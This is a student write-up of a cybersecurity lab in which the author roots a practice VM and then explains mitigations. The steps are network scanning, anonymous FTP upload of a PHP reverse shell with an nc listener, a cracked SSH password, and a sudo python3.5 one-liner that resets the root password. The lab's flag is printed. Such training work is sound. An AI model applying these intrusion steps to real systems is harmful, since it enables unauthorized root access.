# Local

## [Subject](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local)

## [Audit](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local/audit)

## [Video▶️](https://www.youtube.com/watch?v=sB7yzPquSPY)

## Table of Contents

- [Subject](#subject)
- [Audit](#audit)
- [Task description](#task-description)
- [Privilege escalation](#privilege-escalation)
- [Integrity of the VM](#integrity-of-the-vm)
- [Steps to reach root access](#steps-to-reach-root-access)
  - [Finding ip address](#finding-ip-address)
  - [Nmap scan to see open ports and services](#nmap-scan-to-see-open-ports-and-services)
  - [Scan for directories on the website](#scan-for-directories-on-the-website)
  - [Log in through ftp](#log-in-through-ftp)
  - [Gaining access with reverse shell](#gaining-access-with-reverse-shell)
  - [Privilege escalation](#privilege-escalation)
- [Steps to fixing the vulnerabilities](#explaining-the-vulnerabilities-and-how-to-fix-them)
  - [FTP anonymous logon exploit mitigation](#ftp-anonymous-logon-exploit)
  - [Webserver directory listing exploit](#webserver-directory-listing-exploit)
  - [FTP script upload exploit](#ftp-script-upload-exploit)
  - [Script execution exploit](#script-execution-exploit)
  - [Unauthorized access to sudo](#unauthorized-access-to-sudo)
- [Author](#author)

## Task description

In this project you will learn about Privilege escalation We will provide a VM 01-Local1.ova. You have to install it locally in VirtualBox And then find a way to go inside it and get root access. There will be no visible IP address, you must find a way to get it. You have to become root and get the flag.

## What is privilege escalation

Privilege escalation is gaining more access and control over the system than you are supposed to have. This can be achieved by exploiting vulnerabilities and misconfigurations in system permissions. In some cases the attacker may be able to gain root access and therefore have full control over given system. It's a common method in cyberattacks.

## Integrity of the VM

```
$ sha1sum 01-Local1.ova
f3422f3364fd38e8183740f8f57fa951d3f6e0bf 01-Local1.ova
```

Im using powershell beacuse im running the vm on a windows mashine :P

```
Get-FileHash C:\01-Local.ova -Algorithm sha1

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA1            F3422F3364FD38E8183740F8F57FA951D3F6E0BF                               C:\01-Local.ova
```

Its upercase but its the same key.

## Steps to reach root access

### Finding ip address

Scan the entire local network for active devices.

```
sudo arp-scan -l
```

Found IP 192.168.1.204

### Nmap scan to see open ports and services

```
nmap -A 192.168.1.204
```

Found open ports 21 (ftp service running and anonymus login), 22 (ssh) and 80 (http, appache running)

Go to apache website http://192.168.1.204/ and confirm its running and shows something.

### Scan for directories on the website

```
dirb http://192.168.1.204/
```

found dir /files/

go to http://192.168.1.204/files

### Log in through ftp

```
ftp 192.168.1.204
```

username: anonymous

no password

### Gaining access with reverse shell

Get script from https://www.revshells.com/

Set ip as my own and a random port

Send script to target mashine through ftp

```
ftp> send shell.php
```

Separate terminal set up listener

```
nc -lvnp 12345
```

Go to http://192.168.1.204/files and click on shell.php

Now we have connection

Looking around, home dir has some files.

```
cd /home
```

```
cat important.txt
cat /.runme.sh
```

/.runme.sh has a password hash

Decrypt hash at https://hashes.com/en/decrypt/hash

Establish ssh connection into mashine with username shrek.

```
ssh shrek@192.168.1.204
```

Password: youaresmart

User dir has txt file with ascii art and message: "I generated this ascii art with python3.5, is it cool?"

### Privilege escalation

Since the hint was python3.5 use it to change root password

```
sudo /usr/bin/python3.5 -c 'import os; os.system("sudo passwd root")'
```

Enter new password

login as root

```
su root
```

Looking around, root dir has a file.

```
cd

cat root.txt

Congratulations, You have successfully completed the challenge!
Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

## Explaining the vulnerabilities and how to fix them

### FTP anonymous logon exploit

FTP allows anonymous logon, therefore everyone who has the ip can log in and potentially see sensitive data or upload files that can cause harm or grant the attacker access to the system.

Mitigation:

Would be preferable to use SFTP (Secure Shell File Transfer Protocol) or FTPS (FTP Secure). These protocols are secured and encrypted.

For the case of normal FTP:

- Disable anonymous logon and functionality
- Enable authorization policy
- Enable strong password policy
- Enable policy for handling invalid logon attempts
- Update to latest verion of FTP service software
- Configure firewall rules to permit traffic only from trusted sources and block unauthorized access attempts.

### Webserver directory listing exploit

Directory listing is a feature of web servers and FTP servers that allows users to view the contents of a directory or folder on a website or server.

With _dirb_ you can scan for available directories in the webserver and discover sensitive files and data.

Mitigation: Disable directory listing to prevent unauthorized access to directory contents.
Implement access controls and permissions to restrict access to sensitive files and directories.
For brute-force attacks implement rate limiting.

### FTP script upload exploit

Allowing the upload of scripts to an FTP server can lead to several security risks, including: code execution, injection attacks, malware distribution. All these can be used to gain unauthorized access to the system or cause harm otherwise.

To mitigate implement:

- File type restrictions to prevent the upload of executables or other files that may cause security risks
- Require authentication credentials for data transfer.
- Have an up-to-date antivirus/malware scanning tool to check uploaded files regularly

### Script execution exploit

By clicking on the uploaded script file in the /files directory Im able to execute the script.

This can be mitigated by:

- Implementing strict controls on script execution permissions to prevent the execution of unauthorized scripts or commands.
- Implementing file type restrictions to prevent the file to be uploaded in the first place.

### Unauthorized access to sudo

In /etc/sudoers file we can see that user "shrek" doesn't require sudo password to execute python3.5 scripts:

```
%shrek ALL = NOPASSWD:/usr/bin/python3.5
```

With this you can run any sudo command with python3.5 without root password.

Mitigation:

- Limit the sudo privileges granted to users and groups to only essential commands and operations necessary for their tasks. Avoid granting NOPASSWD privileges unless absolutely required.
- Enable sudo command logging to monitor and track privileged commands executed by users and groups. This helps in identifying suspicious activities and potential security incidents.

## Author

### [laurilaretei](https://01.kood.tech/git/laurilaretei)
